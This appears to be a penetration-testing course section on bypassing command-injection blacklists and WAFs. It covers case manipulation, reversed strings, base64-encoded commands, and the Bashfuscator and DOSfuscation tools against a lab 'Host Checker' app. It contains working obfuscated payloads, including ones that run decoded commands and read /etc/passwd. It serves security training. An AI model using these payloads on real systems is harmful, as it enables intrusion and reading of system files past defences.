In some cases, we may be dealing with advanced filtering solutions like Web Application Firewalls (WAFs), where basic evasion techniques may not necessarily work. We can use more advanced techniques for such occasions, making the detection of injected commands much less likely.

---

## Case Manipulation

One command obfuscation technique we can use is case manipulation, such as reversing the case of command characters (e.g., `WHOAMI`) or alternating between upper and lower case (e.g., `WhOaMi`). This often works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

If we're dealing with a Windows server, we can change the case of the command characters and send it. In Windows, PowerShell and CMD commands are case-insensitive, meaning they will execute the command regardless of how it's written:

```
PS C:\htb> WhOaMi

21y4d
```

However, when dealing with Linux and a bash shell, which are case-sensitive as mentioned earlier, we need to be a bit more creative and find a command that converts the command into a completely lowercase word. A command we can use is the following:

```
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

As we can see, the command worked, even though the word we provided was (`WhOaMi`). This command uses `tr` to replace all uppercase characters with lowercase ones, resulting in a command with all lowercase characters. However, if we try to use the previous command with the `Host Checker` web application, we'll see it's still blocked:

#### Burp POST Request

![Screenshot of a web application interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section shows HTML for a 'Host Checker' form, allowing IP input and displaying 'Invalid input' as the result.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_commands_3.jpg)

`Can you guess why?` It's because the previous command contains spaces, which is a filtered character in our web application, as we've seen before. Therefore, with such techniques, `we must always ensure not to use any filtered characters`, otherwise our requests will fail, and we might think the techniques didn't work.

Once we replace the spaces with tabs (`%09`), we see the command works perfectly:

#### Burp POST Request

![Screenshot of a web application interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section shows HTML for a 'Host Checker' form, allowing IP input and displaying ping results for 127.0.0.1 with the user 'www-data'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_commands_4.jpg)

There are many other commands we can use for the same purpose, such as the following:

```
$(a="WhOaMi";printf %s "${a,,}")
```

Note title: Untitled

Exercise: Can you test the previous command to see if it works on your Linux VM and then try to avoid using filtered characters to make it work in the web application?

---

## Reversed Commands

Another command obfuscation technique we'll discuss is reversing commands and having a command template that reverses and executes them in real time. In this case, we'll write `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

We can get creative with such techniques and create our own Linux/Windows commands that ultimately execute the command without ever containing the actual command words. First, we'd need to get the reversed string of our command in our terminal, like this:

```
echo 'whoami' | rev
imaohw

```

Then, we can execute the original command by reverting it back in a sub-shell (`$()`), as follows:

```
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d

```

We see that, although the command doesn't contain the actual word `whoami`, it works the same way and provides the expected output. We can also test this command with our exercise, and it indeed works:

#### Burp POST Request

![Screenshot of a web application interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section shows HTML for a 'Host Checker' form, allowing IP input and displaying ping results for 127.0.0.1 with the user 'www-data'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_commands_5.jpg)

Tip: If you wanted to evade a character filter using the previous method, you'd also have to reverse them, or include them when reversing the original command.

The same can be applied in `Windows`. First we can reverse a string, like this:

```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Now we can use the following command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

## Encoded Commands

The last technique we will discuss is useful for commands that contain filtered characters or characters that can be URL-decoded by the server. This could cause the command to become scrambled by the time it reaches the shell and ultimately fail to execute. Instead of copying an existing command online, this time we will try to create our own unique obfuscated command. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique for each case, depending on which characters are allowed and the level of security on the server.

We can use various encoding tools, such as `base64` (for b64 encoding) or `xxd` (for hexadecimal encoding). Let's take `base64` as an example. First, we will encode the payload we want to execute (which includes filtered characters):

```
echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), then pass it to `bash` for execution (using `bash<<<`), as follows:

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

As we can see, the previous command executes perfectly. We didn't include any filtered characters and avoided encoded characters that could cause the command to fail during execution.

Tip: Note that we're using `<<<` to avoid using a pipe `|`, which is a filtered character.

Now we can use this command (after replacing the spaces) to execute the same command through command injection:

#### Burp POST Request

![Screenshot of a web application interface showing a POST request to 127.0.0.1 with headers and a command injection attempt using base64 decoding. The response section shows HTML for a 'Host Checker' form, allowing IP input and displaying ping results for 127.0.0.1 with user 'www-data' and additional user information.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/109/cmdinj_filters_commands_6.jpg)

Even if certain commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques discussed in the previous section (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

We can also use the same technique with Windows. First, we need to encode our string in base64, as follows:

```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

We can achieve the same in Linux, but we would need to convert the string from `utf-8` to `utf-16` before encoding it in `base64`, as follows:

```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

As we can see, we can get creative with `Bash` or `PowerShell` and devise new evasion and obfuscation methods that haven't been used before, making them highly likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we'll discuss in the next section.

Beyond the techniques we've covered, we can employ many other methods, such as wildcards, regular expressions (regex), output redirection, integer expansion, and more. Some of these techniques can be found in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).

When dealing with advanced security tools, basic manual obfuscation techniques may not suffice. In such cases, it's often better to turn to automated obfuscation tools. This section will cover a couple of examples of such tools, one for `Linux` and another for `Windows`.

---

## Linux (Bashfuscator)

A useful tool for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements as follows:

```
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user


```

Once we have the tool configured, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to adjust our final obfuscated command, as we can see in the help menu `-h`:

```
cd ./bashfuscator/bin/
./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

We can start simply by providing the command we want to obfuscate with the `-c` flag:

```
./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

However, running the tool this way will randomly select an obfuscation technique, which can produce a command length ranging from a few hundred characters to over a million! Therefore, we can use some of the flags from the help menu to generate a shorter and simpler obfuscated command, as follows:

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

Now we can test the resulting command with `bash -c ''`, to see if it actually executes the desired command:

```
bash -c 'eval "$(W0=(w \  t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

Note title: Untitled

We can see that the obfuscated command works, while appearing completely obfuscated and not resembling our original command. We can also note that the tool uses many obfuscation techniques, including those we discussed earlier and many others.

Exercise: Try testing the above command with our web application to see if it can successfully bypass the filters. If it doesn't, can you guess why? And can you make the tool produce a payload that works?

---

## Windows (DOSfuscation)

There is also a very similar tool we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to obtain the desired obfuscated command. We can, once again, clone the tool from GitHub and then invoke it via PowerShell, as follows:

```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

We can even use `tutorial` to see an example of how the tool works. Once we're ready, we can start using the tool as follows:

```
  Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
Finally, we can attempt to execute the obfuscated command in `CMD`, and we see that it functions as expected:

```
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Tip: If we don't have access to a Windows VM, we can run the above code on a Linux VM using `pwsh`. Run `pwsh` and then follow exactly the same steps as above. This tool comes preinstalled on your `Pwnbox` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

